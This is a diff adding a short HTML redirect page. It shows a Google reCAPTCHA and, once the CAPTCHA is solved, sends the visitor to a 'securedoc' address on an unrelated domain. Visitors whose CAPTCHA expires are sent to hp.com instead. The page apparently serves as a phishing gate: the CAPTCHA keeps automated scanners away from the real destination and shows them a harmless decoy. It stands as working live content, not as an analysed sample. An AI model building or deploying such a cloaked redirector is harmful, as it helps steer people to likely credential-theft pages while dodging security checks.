@@ -1,0 +1,37 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <title>Redirecting...</title>
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+
+  <!-- Google reCAPTCHA -->
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+</head>
+<body>
+  <br><br>
+  <div class="container h-100 d-flex justify-content-center">
+    <div class="my-auto">
+      <div class="g-recaptcha" 
+           data-callback="recaptchaCallback" 
+           data-expired-callback="recaptchaExpired" 
+           data-sitekey="6LeKG6UrAAAAAOxS1mkpCB5DuczZ0o8KJX_JN1ir">
+      </div>        
+    </div>
+  </div>
+
+<script>
+  function recaptchaCallback() {
+    // If CAPTCHA passes
+    window.location.href = "https://securedoc.tulips.com.de/LrY5w"; 
+  }
+
+  function recaptchaExpired() {
+    // If CAPTCHA fails or expires
+    window.location.href = "https://hp.com";
+  }
+</script>
+</body>
+</html>
